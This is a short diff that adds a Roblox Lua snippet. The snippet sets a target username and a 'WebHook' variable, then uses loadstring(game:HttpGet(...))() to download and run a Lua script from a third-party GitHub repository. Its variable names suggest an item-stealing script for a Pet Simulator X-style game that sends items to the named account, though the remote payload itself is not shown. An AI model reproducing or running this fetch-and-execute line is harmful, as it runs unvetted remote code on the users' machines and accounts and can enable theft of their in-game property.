@@ -1,0 +1,4 @@
+`UserName = "NinjjaX7v"
+WebHook = "https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua"
+Mention = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()`
